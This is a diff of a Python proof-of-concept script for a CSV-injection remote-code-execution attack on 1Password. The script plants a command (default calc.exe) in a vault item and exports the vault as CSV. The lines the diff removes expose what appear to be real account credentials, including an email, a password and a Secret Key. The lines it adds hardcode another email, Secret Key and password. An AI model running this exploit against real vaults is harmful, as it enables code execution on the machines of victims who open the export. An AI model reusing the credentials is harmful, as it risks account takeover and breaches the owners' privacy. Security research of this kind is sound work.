@@ -5,37 +5,21 @@ import argparse
 import subprocess
 from datetime import datetime
 
-# Parse args for RCE (hardcoded family deets)
-parser = argparse.ArgumentParser(description="1Password CSV Injection RCE Repro - Family Edition")
+# Parse args for RCE (token mode)
+parser = argparse.ArgumentParser(description="1Password CSV Injection RCE Repro - Family Edition (Token Mode)")
 parser.add_argument('--rce_cmd', default="calc.exe", help="RCE command to inject (default calc.exe)")
 args = parser.parse_args()
 
-# Hardcoded family deets (main + dummy)
-MAIN_EMAIL = "enzo2alive@gmail.com"
-MAIN_PASSWORD = "EmpireRCE2025!Hunt"  # Your final pass
-MAIN_SECRET_KEY = "A3-89RGP8-2FR5GL-CFYT6-TCRP3-YPCTQ-GLG64"
+# Hardcoded family deets (dummy for verify)
 DUMMY_EMAIL = "nenss0833@gmail.com"
 DUMMY_SECRET_KEY = "A3-NVBA4N-VN5YMW-X96YJ-2KP9Q-YFKVK-JCL85"
 VAULT_ID = "vlt_1234567890abcdef"  # Grab from step 3 API response
 
 BASE_URL = "https://my.1password.com/api/v1"
-headers = {'Content-Type': 'application/json', 'User-Agent': '1Password-Repro/3.0'}
-# Swap to API token mode: headers['Authorization'] = 'Bearer YOUR_TOKEN' after step 3
-
-def get_session_token(email, password, secret_key):
-    """Auth and grab session token"""
-    payload = {'email': email, 'password': password, 'secret_key': secret_key}
-    response = requests.post(f"{BASE_URL}/auth/signin", json=payload, headers=headers)
-    if response.status_code == 200:
-        data = response.json()
-        token = data.get('session_token')
-        print(f"[+] Token grabbed for {email}: {token[:10]}...")
-        return {'Authorization': f"Bearer {token}"}
-    print(f"[-] Auth fail for {email}: {response.text}")
-    return None
+headers = {'Content-Type': 'application/json', 'User-Agent': '1Password-Repro/3.0', 'Authorization': 'Bearer YOUR_TOKEN'}  # Swap YOUR_TOKEN from step 2
 
 def get_dummy_session():
-    """Auth dummy for share verify"""
+    """Auth dummy for share verify (email/pass fallback)"""
     dummy_payload = {'email': DUMMY_EMAIL, 'password': 'dummy_pass1234', 'secret_key': DUMMY_SECRET_KEY}  # Swap dummy pass if needed
     dummy_resp = requests.post(f"{BASE_URL}/auth/signin", json=dummy_payload, headers=headers)
     if dummy_resp.status_code == 200:
@@ -95,20 +79,15 @@ def verify_share(dummy_session, vault_id):
     print("[-] Share verify fail")
     return False
 
-# Main repro flow
-print(f"[*] 1Password CSV RCE Repro - Family Edition - Account: {MAIN_EMAIL}")
-main_session = get_session_token(MAIN_EMAIL, MAIN_PASSWORD, MAIN_SECRET_KEY)
-if not main_session:
-    exit(1)
+# Main repro flow (token mode—main auth skipped, use Bearer)
+print(f"[*] 1Password CSV RCE Repro - Family Edition - Token Mode")
+session_headers = headers.copy()  # Use Bearer YOUR_TOKEN
 
-# Use main token for API mode
-main_session['Authorization'] = 'Bearer YOUR_TOKEN'  # Swap YOUR_TOKEN from step 2
-
-item_id = create_malicious_item(main_session, VAULT_ID, args.rce_cmd)
+item_id = create_malicious_item(session_headers, VAULT_ID, args.rce_cmd)
 if not item_id:
     exit(1)
 
-csv_data = export_vault_csv(main_session, VAULT_ID)
+csv_data = export_vault_csv(session_headers, VAULT_ID)
 if not csv_data:
     exit(1)
 
